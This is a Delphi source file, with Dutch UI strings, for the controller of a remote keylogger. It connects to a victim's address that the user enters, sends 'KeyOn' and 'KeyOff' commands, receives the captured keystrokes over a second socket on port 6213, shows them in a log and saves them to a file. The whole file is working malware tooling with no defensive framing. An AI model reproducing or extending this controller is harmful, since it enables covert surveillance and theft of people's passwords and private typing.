unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ScktComp, ComCtrls, ExtCtrls, StdCtrls;

type
  TForm1 = class(TForm)
    GroupBox1: TGroupBox;
    RichLogger: TMemo;
    GroupBox2: TGroupBox;
    Label1: TLabel;
    Edit1: TEdit;
    Panel1: TPanel;
    Panel2: TPanel;
    GroupBox3: TGroupBox;
    Panel3: TPanel;
    Panel4: TPanel;
    Panel5: TPanel;
    Panel6: TPanel;
    StatusBar1: TStatusBar;
    ClientLogger: TClientSocket;
    ClientSocket1: TClientSocket;
    ChkAuto: TCheckBox;
    SaveDialog1: TSaveDialog;
    procedure ClientSocket1Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Disconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientLoggerConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientLoggerError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientLoggerRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Panel3Click(Sender: TObject);
    procedure Panel4Click(Sender: TObject);
    procedure Panel1Click(Sender: TObject);
    procedure Panel2Click(Sender: TObject);
    procedure Panel6Click(Sender: TObject);
    procedure Panel5Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.ClientSocket1Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
StatusBar1.SimpleText :='Verbonden met: ' + Edit1.Text + '..';
end;

procedure TForm1.ClientSocket1Disconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  ClientSocket1.Active:=False;
  ClientLogger.Active:=False;
end;

procedure TForm1.ClientSocket1Error(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  ErrorCode:=0;
 StatusBar1.SimpleText:='Kan niet verbinden.';
end;

procedure TForm1.ClientSocket1Read(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 StatusBar1.SimpleText:=Socket.ReceiveText;
end;

procedure TForm1.ClientLoggerConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 StatusBar1.SimpleText :='KeyLogger ingeschakeld.';
end;

procedure TForm1.ClientLoggerError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
   ErrorCode:=0;
   StatusBar1.SimpleText :='Fout tijdens inschakelen van KeyLogger';
end;

procedure TForm1.ClientLoggerRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
   with Form1 do
   begin
      RichLogger.Text:=RichLogger.Text + Socket.ReceiveText;
      if ChkAuto.Checked then
      SendMessage(RichLogger.Handle,WM_VSCROLL,SB_PAGEDOWN,0);
   end;
end;

procedure TForm1.Panel3Click(Sender: TObject);
begin
   ClientLogger.Address :=Edit1.Text;
   ClientLogger.Port :=6213;
   ClientLogger.Open;
   ClientLogger.Active :=true;
   StatusBar1.SimpleText :='Proberen om KeyLogger aan te zetten..';
   ClientSocket1.Socket.SendText('KeyOn');
end;

procedure TForm1.Panel4Click(Sender: TObject);
begin
   ClientSocket1.Socket.SendText('KeyOff');
   StatusBar1.SimpleText :='KeyLogger Uitgeschakeld';
end;

procedure TForm1.Panel1Click(Sender: TObject);
begin
 if ClientSocket1.Active then ClientSocket1.Active:=false
 else begin
  ClientSocket1.Address:=Edit1.Text;
  ClientSocket1.Active:=true;
  StatusBar1.SimpleText:='Verbinden met adres..';
end;
end;

procedure TForm1.Panel2Click(Sender: TObject);
begin
ClientSocket1.Close;
StatusBar1.SimpleText :='Verbroken';
end;


procedure TForm1.Panel6Click(Sender: TObject);
begin
RichLogger.Lines.Clear;
end;

procedure TForm1.Panel5Click(Sender: TObject);
begin
Savedialog1.Execute;
RichLogger.Lines.SaveToFile(savedialog1.Name);
end;

end.




